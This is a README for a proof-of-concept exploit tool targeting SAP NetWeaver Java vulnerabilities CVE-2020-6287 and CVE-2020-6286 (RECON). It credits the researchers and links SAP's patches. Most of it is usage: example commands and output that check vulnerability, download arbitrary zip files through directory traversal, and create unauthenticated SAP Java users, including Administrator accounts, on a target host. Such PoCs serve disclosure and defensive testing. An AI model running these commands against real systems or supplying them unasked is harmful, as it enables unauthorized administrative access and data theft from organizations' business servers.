PoC for CVE-2020-6287, CVE-2020-6286 (SAP RECON vulnerability)

~~Pffff! RECON (Remotely Exploitable Code On NetWeaver)? Guys, really? That was the best codename you came up with? :)~~ 

This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and as a PoC script exploits directory traversal in `queryProtocol` method.

Directory traversal allows to download any `zip` from SAP server.

***This project is created only for educational purposes and cannot be used for law violation or personal gain.
<br>The author of this project is not responsible for any possible harm caused by the materials of this project***

Original finding: 

CVE-2020-6287: [Pablo Artuso](https://twitter.com/lmkalg)<br>
CVE-2020-6286: [Yvan 'iggy' G.](https://twitter.com/_1ggy) 

Solution: [#2934135](https://launchpad.support.sap.com/#/notes/2934135), [#2939665](https://launchpad.support.sap.com/#/notes/2939665)



# How to use


Just point SAP NW AS Java hostnmae/ip.

There is additional options:

1. `-c` - check if SAP server is vulnerable to RECON
2. `-f` - download `zip` file from SAP server
3. `-u` - create user SAP JAVA user with  `Authenticated User` role 
4. `-a` - create user SAP JAVA user with  `Administrator` role


Ex.: Download zip file

```
~python RECON.py -H 172.16.30.8 -f /1111.zip
Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Ok! File zipfile_929.zip was saved
```


Ex.: Create SAP JAVA user

```
~python RECON.py -H 172.16.30.8 -u
Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Going to create new user. sapRpoc5484:Secure!PwD9379
Ok! User were created
```

Ex.: Create SAP JAVA Administrator user

```
~python RECON.py -H 172.16.30.8 -a
Check1 - Vulnerable! [CVE-2020-6287] (RECON) - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
Going to create new user sapRpoc5574:Secure!PwD7715 with role 'Administrator'
Ok! Admin user were created
```

## All options


```
~python RECON.py -h
usage: RECON.py [-h] [-H HOST] [-P PORT] [-p PROXY] [-s] [-c] [-f ZIPFILE]
                [-u] [-a] [--timeout TIMEOUT] [-v]

PoC for CVE-2020-6287,  (RECON)
This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
Original finding:
- Pablo Artuso. https://twitter.com/lmkalg
- Yvan 'iggy' G https://twitter.com/_1ggy

Thanks:
- Spencer McIntyre https://twitter.com/zeroSteiner

Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  Java NW host (default: 127.0.0.1)
  -P PORT, --port PORT  Java NW web port (default: tcp/50000)
  -p PROXY, --proxy PROXY
                        Use proxy (ex: 127.0.0.1:8080)
  -s, --ssl             enable SSL
  -c, --check           just detect vulnerability
  -f ZIPFILE, --zipfile ZIPFILE
                        ZIP file to read. CVE-2020-6286
  -u, --user            Create simple JAVA user. CVE-2020-6287
  -a, --admin           Create JAVA user with role "Administrator". CVE-2020-6287
  --timeout TIMEOUT     HTTP connection timeout in second (default: 10)
  -v, --verbose         verbose mode
```
